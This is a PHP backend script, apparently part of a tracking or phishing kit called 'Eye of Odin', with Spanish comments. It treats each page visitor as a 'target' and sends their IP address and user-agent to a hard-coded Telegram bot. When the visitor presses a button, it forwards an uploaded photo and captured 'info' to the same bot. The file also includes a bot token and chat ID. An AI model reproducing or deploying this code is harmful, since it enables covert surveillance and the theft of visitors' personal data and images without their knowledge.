<?php
// --- CONFIGURACIÓN DE EYE OF ODIN ---
$token = "8458522831:AAER4WucjipsFHRD7wbXbC-iZOgNKLgQiYI";
$chat_id = "5639483306";    // Sustituye por tu ID

// Función para enviar mensajes a Telegram
function enviarTelegram($metodo, $datos, $token) {
    $url = "https://api.telegram.org/bot$token/$metodo";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

// 1. SI ES UNA PETICIÓN DE "OBJETIVO EN LÍNEA" (Carga de página)
if (isset($_GET['online'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $msg = "🔔 *EYE OF ODIN: OBJETIVO EN LÍNEA*\n\n";
    $msg .= "🌐 *IP:* `$ip`\n";
    $msg .= "📱 *User-Agent:* $ua\n";
    $msg .= "⏳ Esperando ejecución de escaneo...";
    
    enviarTelegram("sendMessage", [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ], $token);
    exit;
}

// 2. SI ES EL ENVÍO DE DATOS (Cuando presiona el botón)
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['photo'])) {
    $info = $_POST['info'];
    $foto = $_FILES['photo'];

    $datos_foto = [
        'chat_id'   => $chat_id,
        'photo'     => new CURLFile($foto['tmp_name'], $foto['type'], $foto['name']),
        'caption'   => $info,
        'parse_mode' => 'Markdown'
    ];

    enviarTelegram("sendPhoto", $datos_foto, $token);
    echo json_encode(['status' => 'success']);
}

?>

